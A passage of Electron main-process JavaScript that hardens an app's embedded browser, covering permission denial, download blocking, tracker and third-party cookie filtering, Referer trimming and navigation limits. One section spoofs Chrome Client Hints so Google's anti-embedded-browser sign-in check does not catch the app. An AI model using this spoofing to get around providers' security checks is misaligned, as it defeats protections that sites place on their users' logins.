                if (_shouldAllowOpenExternal(contents)) _shell.openExternal(url);
                else console.warn('[maker] external open rate-limited');
                return { action: 'deny' };
            }
            // Most user-intent clicks land in 'foreground-tab' or
            // 'new-window'. We accept those; 'background-tab' and
            // 'save-to-disk' are programmatic vectors we'd rather not act on.
            const allowedDispositions = new Set(['foreground-tab', 'new-window']);
            if (disposition && !allowedDispositions.has(disposition)) {
                return { action: 'deny' };
            }
            if (!_shouldAllowOpenExternal(contents)) {
                console.warn('[browse] new-tab open rate-limited');
                return { action: 'deny' };
            }
            // contents is the opener webview's own webContents; its id is
            // what the renderer stored as tab.webContentsId, so the owning
            // window can place the new tab next to the opener and inherit
            // its private/normal mode. Other windows ignore it.
            broadcastToAllWindows('browse-open-tab', {
                url,
                openerWebContentsId: contents.id
            });
            return { action: 'deny' };
        });

        // Block any in-webview navigation away from http(s). Defense
        // against meta-refresh / programmatic location.assign('file://...').
        contents.on('will-navigate', (e, url) => {
            if (_isMaker) {
                // Internal multi-page navigation within the artifact is fine.
                if (/^(anjadhe-artifact:\/\/|about:blank)/i.test(url)) return;
                // A same-frame external link (no target="_blank") should open
                // in the OS browser, not replace the artifact in the preview.
                if (/^https?:\/\//i.test(url)) {
                    e.preventDefault();
                    if (_shouldAllowOpenExternal(contents)) _shell.openExternal(url);
                    return;
                }
                e.preventDefault();
                return;
            }
            if (!/^(https?:\/\/|about:blank)/i.test(url)) {
                e.preventDefault();
                console.warn('[browse] blocked navigation to non-http URL:', url.slice(0, 80));
            }
        });

        // Stop WebRTC from leaking the LAN IP via STUN candidates. The
        // 'default_public_interface_only' policy uses only the public-
        // facing interface for candidate gathering; STUN no longer
        // surfaces 192.168.x / 10.x private addresses to script.
        try {
            contents.setWebRTCIPHandlingPolicy('default_public_interface_only');
        } catch (e) {
            console.warn('[privacy] WebRTC policy set failed:', e.message);
        }
    }
});

// Chrome-spoofed Client Hints used to dodge Google's anti-embedded-
// browser check on sign-in. Major version must stay in sync with the UA
// string in _createTab (Chrome/124 at time of writing).
const _CH_ARCH = process.arch === 'arm64' ? '"arm"' : '"x86"';

// Harden a Browse session: deny sensitive permissions by default, cancel
// downloads (drive-by-download protection), and refuse permission checks
// that aren't explicitly allowed. Called once for the persistent partition
// (`persist:browse`) and once for the ephemeral private partition. Wiring
// it for both keeps Private tabs covered by the same tracker blocking,
// referer reduction, and 3rd-party-cookie strip as normal tabs.
function _configureBrowseSession(partitionName) {
    const { session } = require('electron');
    const browseSession = session.fromPartition(partitionName);

    // Permission requests: deny camera, microphone, geolocation, MIDI,
    // and HID/serial/USB — these are high-impact and we have no UI to
    // surface a meaningful prompt. Allow notifications + clipboard-read
    // (low-impact, per-site) and deny everything else by default.
    const ALLOWED_PERMISSIONS = new Set(['notifications', 'clipboard-read', 'fullscreen']);
    browseSession.setPermissionRequestHandler((_webContents, permission, callback) => {
        const allow = ALLOWED_PERMISSIONS.has(permission);
        if (!allow) console.log(`[browse] denied permission request: ${permission}`);
        callback(allow);
    });
    browseSession.setPermissionCheckHandler((_webContents, permission) => {
        return ALLOWED_PERMISSIONS.has(permission);
    });

    // Drive-by download protection: cancel every download originating
    // from the Browse partition. The user should not silently get an
    // executable in ~/Downloads from a page they're just reading. If
    // they want a downloads UX later we can add an explicit consent
    // dialog here, but the default must be deny.
    browseSession.on('will-download', (event, item, _webContents) => {
        const filename = item.getFilename ? item.getFilename() : '(unknown)';
        console.warn(`[browse] cancelled download: ${filename}`);
        item.cancel();
        // Surface to the user via the renderer.
        BrowserWindow.getAllWindows().forEach(w => {
            if (!w.isDestroyed()) {
                w.webContents.send('browse-download-blocked', { filename });
            }
        });
    });

    // ── Privacy filter: block tracker requests, strip tracking params
    // from navigations, attach DNT/Sec-GPC headers, force origin-only
    // Referer cross-origin, and drop 3rd-party Cookie / Set-Cookie. ──

    browseSession.webRequest.onBeforeRequest({ urls: ['<all_urls>'] }, (details, callback) => {
        try {
            // 1) Top-level navigations: rewrite to a clean URL if the
            // user clicked a tracking-laden link (utm_*, fbclid, …).
            if (details.resourceType === 'mainFrame') {
                const cleaned = stripTrackingParams(details.url);
                if (cleaned !== details.url) {
                    return callback({ redirectURL: cleaned });
                }
                return callback({});
            }

            // 2) Sub-resource: drop if the host is on the blocklist and
            // the embedding page isn't on the user's per-site allowlist.
            const topUrl = _topFrameUrl(details);
            if (!_isProtectedTopHost(topUrl)) return callback({});

            if (TrackerBlocklist.isBlocked(details.url)) {
                let blockedHost = '';
                try { blockedHost = new URL(details.url).hostname; } catch {}
                _broadcastBlock(details.webContentsId, topUrl, blockedHost);
                return callback({ cancel: true });
            }
            callback({});
        } catch (e) {
            // Never let an exception in the filter break navigation.
            console.warn('[privacy] onBeforeRequest threw:', e.message);
            callback({});
        }
    });

    browseSession.webRequest.onBeforeSendHeaders({ urls: ['<all_urls>'] }, (details, callback) => {
        try {
            const headers = { ...details.requestHeaders };

            // Privacy signals — DNT + Global Privacy Control. Both are
            // request-side hints; whether a site honors them is on them,
            // but Sec-GPC has a legal hook in some US states (CCPA).
            headers['DNT'] = '1';
            headers['Sec-GPC'] = '1';

            // Rewrite Client Hints to match a stock Chrome build. Chromium
            // synthesizes Sec-CH-UA from the binary it's running, so on
            // Electron the brand list leaks "Electron";v="…" to every site
            // — even when the UA string says Chrome. Google's sign-in flow
            // reads that header and bounces us with "browser may not be
            // secure". Other Chromium-based browsers (Brave, Vivaldi)
            // rewrite these the same way. The values below mirror Chrome
            // stable's defaults; keep the major version in sync with what
            // the spoofed UA in _createTab claims.
            for (const k of Object.keys(headers)) {
                const lk = k.toLowerCase();
                if (lk === 'sec-ch-ua') {
                    headers[k] = '"Google Chrome";v="124", "Chromium";v="124", "Not-A.Brand";v="99"';
                } else if (lk === 'sec-ch-ua-mobile') {
                    headers[k] = '?0';
                } else if (lk === 'sec-ch-ua-platform') {
                    headers[k] = '"macOS"';
                } else if (lk === 'sec-ch-ua-full-version-list') {
                    headers[k] = '"Google Chrome";v="124.0.6367.119", "Chromium";v="124.0.6367.119", "Not-A.Brand";v="99.0.0.0"';
                } else if (lk === 'sec-ch-ua-platform-version') {
                    headers[k] = '"14.0.0"';
                } else if (lk === 'sec-ch-ua-arch') {
                    headers[k] = _CH_ARCH;
                } else if (lk === 'sec-ch-ua-bitness') {
                    headers[k] = '"64"';
                }
            }

            // Strip the Referer down to origin on cross-origin requests
            // so we don't leak the source page's full path/query to the
            // destination. Browsers' "strict-origin-when-cross-origin"
            // default applied uniformly.
            const referer = headers['Referer'] || headers['referer'];
            if (referer) {
                try {
                    const refOrigin = new URL(referer).origin;
                    const reqOrigin = new URL(details.url).origin;
                    if (refOrigin !== reqOrigin) {
                        headers['Referer'] = refOrigin + '/';
                        // Some servers look at lowercase too — keep them in sync.
                        if (headers['referer']) headers['referer'] = refOrigin + '/';
                    }
                } catch {}
            }

            // 3rd-party cookies: if the request site's eTLD+1 doesn't
            // match the top-frame's eTLD+1, strip outgoing Cookie. The
            // matching `Set-Cookie` strip is in onHeadersReceived.
            const topUrl = _topFrameUrl(details);
            if (topUrl) {
                try {
                    const topSite = _eTLDPlusOne(new URL(topUrl).hostname);
                    const reqSite = _eTLDPlusOne(new URL(details.url).hostname);
                    if (topSite && reqSite && topSite !== reqSite) {
                        delete headers['Cookie'];
                        delete headers['cookie'];
                    }
                } catch {}
            }

            callback({ requestHeaders: headers });
        } catch (e) {
            console.warn('[privacy] onBeforeSendHeaders threw:', e.message);
            callback({ requestHeaders: details.requestHeaders });
        }
    });

    browseSession.webRequest.onHeadersReceived({ urls: ['<all_urls>'] }, (details, callback) => {
        try {
            const responseHeaders = details.responseHeaders || {};
            const topUrl = _topFrameUrl(details);
            const isThirdParty = (() => {
                if (!topUrl) return false;
                try {
                    const topSite = _eTLDPlusOne(new URL(topUrl).hostname);
                    const reqSite = _eTLDPlusOne(new URL(details.url).hostname);
                    return !!(topSite && reqSite && topSite !== reqSite);
                } catch { return false; }
            })();

            // 3rd-party Set-Cookie → drop entirely. 1st-party Set-Cookie
            // is left alone (with its expires/max-age intact) so site
            // logins survive app restarts. Users who want a no-trace
            // session should open a Private tab (Cmd+Shift+N), which uses
            // an in-memory partition that's wiped when its last tab
            // closes. Header keys are case-insensitive but Electron
            // preserves the server's casing — walk all keys.
            if (isThirdParty) {
                for (const k of Object.keys(responseHeaders)) {
                    if (k.toLowerCase() === 'set-cookie') delete responseHeaders[k];
                }
            }
            callback({ responseHeaders });
        } catch (e) {
            console.warn('[privacy] onHeadersReceived threw:', e.message);
            callback({ responseHeaders: details.responseHeaders });
        }
    });
}

// Partition names. Keep these in sync with the renderer (browse-app.js
// resolves them by tab.isPrivate). The private partition has no `persist:`
// prefix so Electron treats its storage as in-memory only.
const BROWSE_PARTITION = 'persist:browse';
const BROWSE_PRIVATE_PARTITION = 'browse-private';

app.whenReady().then(() => {
    try {
        TrackerBlocklist.init(app.getPath('userData'));
        _loadPrivacyAllowlist();
    } catch (e) {
        console.error('[privacy] init failed:', e);
    }
    try { _configureBrowseSession(BROWSE_PARTITION); }
    catch (e) { console.error('[browse] persistent session hardening failed:', e); }
    try { _configureBrowseSession(BROWSE_PRIVATE_PARTITION); }
    catch (e) { console.error('[browse] private session hardening failed:', e); }

    // Capture renderer-initiated network (fetch from index.html — the
    // analytics ping and the portfolio price chart). Node http/https from
    // the main process is already covered by NetworkLogger.install(); this
    // adds the Chromium side. The Browse sub-app uses its own partitioned
    // sessions, so the user's general web browsing is NOT logged here.
    try {
        const { session } = require('electron');
        const wr = session.defaultSession.webRequest;
        // Tracks request start times keyed by Chromium request id. Chromium
        // does NOT guarantee onCompleted/onErrorOccurred fires for every
        // onSendHeaders (internal redirects, aborted navigations), so this
        // Map is bounded by TTL + hard size cap to prevent an unbounded
        // leak over a long-lived session. Map preserves insertion order, so
        // the oldest entries are at the front.
        const startedAt = new Map();
        const START_TTL_MS = 5 * 60 * 1000;
        const START_MAX = 2000;
        const pruneStarted = () => {
            const cutoff = Date.now() - START_TTL_MS;
            for (const [id, t] of startedAt) {
                if (t >= cutoff && startedAt.size <= START_MAX) break;
                startedAt.delete(id);
            }
        };
        const filter = { urls: ['http://*/*', 'https://*/*'] };
        wr.onSendHeaders(filter, (d) => { pruneStarted(); startedAt.set(d.id, Date.now()); });
        wr.onCompleted(filter, (d) => {
            const start = startedAt.get(d.id); startedAt.delete(d.id);
            NetworkLogger.recordWeb({ url: d.url, method: d.method, statusCode: d.statusCode, start, error: null });
        });
        wr.onErrorOccurred(filter, (d) => {
            const start = startedAt.get(d.id); startedAt.delete(d.id);
            NetworkLogger.recordWeb({ url: d.url, method: d.method, statusCode: null, start, error: d.error });
        });
    } catch (e) {
        console.error('[net-log] defaultSession hook failed:', e);
    }
});

// Wipe the persistent Browse partition on demand. Clears cookies,
// localStorage / IndexedDB, service workers, cache, and saved auth
// state — the equivalent of "Clear browsing data" in a regular
// browser. Returns a summary so the renderer can toast the result.
ipcMain.handle('browse-clear-data', async () => {
    try {
        const { session } = require('electron');
        const browseSession = session.fromPartition(BROWSE_PARTITION);
        await browseSession.clearStorageData({
            // Storage types: cookies, fileSystem, indexdb, localstorage,
            // shadercache, websql, serviceworkers, cachestorage. Omit
            // = clear all.
        });
        await browseSession.clearCache();
        await browseSession.clearAuthCache();
        await browseSession.clearHostResolverCache();
        return { ok: true };
    } catch (e) {
        console.error('[browse] clearData failed:', e);
        return { ok: false, error: e.message || String(e) };
    }
});

// Wipe the ephemeral private partition. Called by the renderer when the
// last private tab closes so any in-memory cookies / localStorage / cached
// requests for that session are gone immediately — not just whenever
// Chromium decides to GC the unused session.
ipcMain.handle('browse-clear-private', async () => {
    try {
        const { session } = require('electron');
        const priv = session.fromPartition(BROWSE_PRIVATE_PARTITION);
        await priv.clearStorageData();
        await priv.clearCache();
        await priv.clearAuthCache();
        return { ok: true };
    } catch (e) {
        console.error('[browse] clearPrivate failed:', e);
        return { ok: false, error: e.message || String(e) };
    }
});

// Privacy state queries from the renderer (shield popover).
ipcMain.handle('browse-privacy-stats', () => {
    try {
        return {
            ok: true,
            blocklist: TrackerBlocklist.stats(),
            allowlistSize: _privacyAllowlist.size,
            disabledHosts: Array.from(_privacyAllowlist)
        };
    } catch (e) {
        return { ok: false, error: e.message };
    }
});

// Toggle per-site protection. `host` is treated as a hostname; we
// canonicalize to eTLD+1 so e.g. mail.example.com flips example.com.
ipcMain.handle('browse-privacy-set-site', (_event, payload) => {
    try {
        const host = _eTLDPlusOne(String((payload && payload.host) || '').trim().toLowerCase());
        if (!host) return { ok: false, error: 'invalid host' };
        const protect = !!(payload && payload.protect);
        if (protect) _privacyAllowlist.delete(host);
        else _privacyAllowlist.add(host);
        _savePrivacyAllowlist();
        return { ok: true, host, protected: protect };
    } catch (e) {
        return { ok: false, error: e.message };
    }
});

// Open a URL in the user's default browser — used by the WAF-block
// banner ("This site is blocking the embedded browser → Open in
// Safari"). Restricted to http(s) so a compromised renderer can't
// hand us file:// or javascript:.
ipcMain.handle('browse-open-external', async (_event, url) => {
    try {
        const s = String(url || '').trim();
        if (!/^https?:\/\//i.test(s)) return { ok: false, error: 'unsupported scheme' };
        const { shell } = require('electron');
        await shell.openExternal(s);
        return { ok: true };
    } catch (e) {
        return { ok: false, error: e.message || String(e) };
    }
});

// Returns the eTLD+1 of a URL — used by the renderer so the popover's
// per-site toggle works on the same canonical key main does. Avoids
// duplicating the two-part-TLD list in renderer code.
ipcMain.handle('browse-privacy-site-key', (_event, url) => {
    try {
        const host = new URL(String(url || '')).hostname;
        return { ok: true, host: _eTLDPlusOne(host), protected: !_privacyAllowlist.has(_eTLDPlusOne(host)) };
    } catch {
        return { ok: false, host: '', protected: true };
    }
});

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit();
    }
});

// Drain any debounced sync-journal writes before the process exits, so a
// quit (or a Cmd-Q at the tail of a typing burst) can't leave a fresher
// edit only in memory.
app.on('before-quit', () => {
    try { flushJournal(); } catch { /* best-effort */ }
    try { MCPManager.stopAll(); } catch { /* best-effort */ }
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        createWindow();
    }
});
